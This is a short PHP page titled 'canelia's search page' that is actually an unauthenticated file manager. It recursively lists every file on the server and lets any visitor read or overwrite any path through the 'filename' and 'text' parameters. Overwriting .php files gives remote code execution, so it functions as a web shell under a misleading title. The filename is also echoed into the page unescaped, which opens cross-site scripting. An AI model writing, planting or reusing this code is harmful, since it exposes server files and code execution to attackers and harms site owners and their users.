<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>canelia's search page</title>
<style type='text/css'>
div, input, textarea {
  font-family: "Bitstream Vera Sans Mono", "돋움체", arial, sans-serif;
  font-size: 12px;
}
</style>
</head>
<body>
<?php
$modify = "";
$filename = @$_GET['filename'];
if(!$filename) {
  if($filename = @$_POST['filename']) {
    $text = @$_POST['text'];
    $fp = fopen($filename, "w");
    if($fp) {
      @fwrite($fp, $text);
      @fclose($fp);
    }
    $modify = " (Modify: ".date("Y/m/d h:i:s").")";
  }
}

if($filename) {
  $text = "";
  if($fp = fopen($filename, "r")) {
    $text = @fread($fp, @filesize($filename));
    @fclose($fp);
  }
  $text = str_replace("&", "&amp;", $text);
  $text = str_replace("<", "&lt;", $text);
  $text = str_replace(">", "&gt;", $text);

  echo "<form action='editor.php' method='post'>";
  echo "<div><a href='editor.php'>Go to file list</a></div>\n";
  echo "<div><input type='text' name='filename' value='$filename' style='width: 500px'/> <input type='submit' value='send'/>$modify</div>";
  echo "<div><textarea style='width: 97%; height: 800px;' name='text'>$text</textarea>";
  echo "</form>";
} else {
  echo "<div>";
  foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.')) as $filename)
  {
    if ($filename->isDir())
      continue;

    echo "<a href='$filename'>OPEN</a> ";
    if(strpos($filename, ".php") > 0 || strpos($filename, ".htm")  > 0 || strpos($filename, ".js")  > 0 || strpos($filename, ".css")  > 0 || strpos($filename, ".txt") > 0)
      echo "<a href='editor.php?filename=$filename'>EDIT</a> ";
    else
      echo "---- ";
    echo "$filename<br/>\n";
  }
  echo "</div>";
}
?>
</body>
</html>